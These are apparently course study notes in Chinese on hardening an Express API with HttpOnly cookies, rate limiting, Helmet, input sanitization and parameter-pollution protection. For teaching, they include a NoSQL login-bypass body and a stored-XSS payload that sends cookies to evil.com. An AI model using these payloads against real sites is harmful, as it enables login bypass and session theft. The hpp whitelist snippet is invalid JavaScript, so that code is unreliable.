# 安全加固

> [!abstract] 本篇定位
> 覆盖课程 #118–#122（依据课程字幕整理，无视频截图）。全课程收官：五道纵深防御——**Cookie 传输、限流、安全响应头、输入消毒、参数污染防护**。每一层对应一类具体攻击。

## 一、用 HttpOnly Cookie 传 JWT（#118）

此前 JWT 放响应 JSON、前端存 localStorage——**XSS**（跨站脚本）攻击得手后 JS 可直接读走令牌。改用 HttpOnly Cookie：

```javascript
const cookieParser = require('cookie-parser');
app.use(cookieParser());

// 登录响应里：
res.cookie('jwt', token, {
  expires: new Date(Date.now() + 90 * 24 * 60 * 60 * 1000),
  secure: true,       // 只经 HTTPS 传输
  httpOnly: true,     // ★ JS 无法读取——XSS 偷不走
});
```

| 选项 | 防什么 |
| :--- | :--- |
| `httpOnly` | XSS 用 JS 偷令牌 |
| `secure` | 明文网络传输被嗅探 |
| （CSRF 需另行对策） | 跨站请求伪造（课程提及但未深入，Express 生态常用 csurf/SameSite） |

官方文档：[Express res.cookie](https://expressjs.com/en/5x/api.html#res.cookie)

## 二、Rate Limiting 限流（#119）

**Brute Force**（暴力猜密码）与 **DoS**（海量请求打瘫服务）的对策是按 IP 限流。bcrypt 的慢哈希（[[06-认证与授权/01-用户模型与密码加密|cost 12]]）已经是第一道减速带，限流补上第二道：

```bash
npm i express-rate-limit
```

```javascript
const rateLimit = require('express-rate-limit');

// 同一 IP 15 分钟最多 100 次请求
const limiter = rateLimit({
  max: 100,
  windowMs: 15 * 60 * 1000,
  message: 'Too many requests from this IP, please try again in an hour!',
});
app.use('/api', limiter);    // 只挂在 API 路由前，静态资源不受影响
```

官方文档：[express-rate-limit on npm](https://www.npmjs.com/package/express-rate-limit)

## 三、Helmet：安全响应头（#120）

浏览器行为（加载什么、谁能调）很大程度由响应头决定。Helmet 一行设置约 11 个安全头（X-Frame-Options 防点击劫持、X-Content-Type-Options 防嗅探、CSP 等）：

```bash
npm i helmet
```

```javascript
const helmet = require('helmet');
app.use(helmet());           // 放在路由【前面】——响应头要在发响应前设置好
```

各头含义见 [Helmet 官方 README](https://github.com/helmetjs/helmet)。可逐项关闭/自定义，默认配置即已覆盖大部分场景。

## 四、数据消毒 Data Sanitization（#121）

恶意请求体两种注入路径，两种消毒中间件：

### 1. NoSQL 注入 → express-mongo-sanitize

攻击者把**操作符当字段值**提交：`{ email: { $gt: "" }, password: { $gt: "" } }`——任何非空都比空大，等于"万能密码"绕过登录查询！

```bash
npm i express-mongo-sanitize
```

```javascript
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());    // 删除 req.body/query/params 里所有以 $ 和 . 开头的键
// 上面的 body 被洗成 { email: {}, password: {} } → 正常验证失败
```

### 2. XSS 注入 → xss-clean

`{ name: "<script>fetch('evil.com?c='+document.cookie)</script>" }` 存库后再渲染就执行了。

```javascript
const xss = require('xss-clean');
app.use(xss());              // 清洗输入中的 HTML 恶意代码
```

> [!note] 生态更新提示
> 课程使用的 `xss-clean` 已停止维护，现代替代品包括 `express-validator` 对逐字段白名单校验、或前端框架默认转义。**思想不变：进库前清洗/校验一切外部输入。**

## 五、防参数污染 HPP（#122）

同一个参数提交两次：`?sort=price&sort=duration`——Express 的 query parser 把它变成**数组** `['price','duration']`，塞进 `query.sort(...)` 可能抛错或产生意外排序。攻击面：绕过/打乱过滤逻辑。

```bash
npm i hpp
```

```javascript
const hpp = require('hpp');
app.use(hpp({
  whitelist: {                // 这几个参数【允许】数组形式（业务上确实需要多个值）
    'duration', 'ratings', 'price', 'releaseDate',
  },
}));
```

官方文档：[hpp on npm](https://www.npmjs.com/package/hpp)

## 六、五层防线总览

| 层 | 中间件/手段 | 防的攻击 |
| :--- | :--- | :--- |
| 令牌传输 | httpOnly Cookie | XSS 偷令牌 |
| 请求频率 | express-rate-limit | Brute Force / DoS |
| 响应头 | helmet | 点击劫持、嗅探、注入面 |
| 输入清洗 | mongo-sanitize + xss-clean | NoSQL 注入 / XSS 存库 |
| 参数结构 | hpp | 参数污染破坏过滤 |
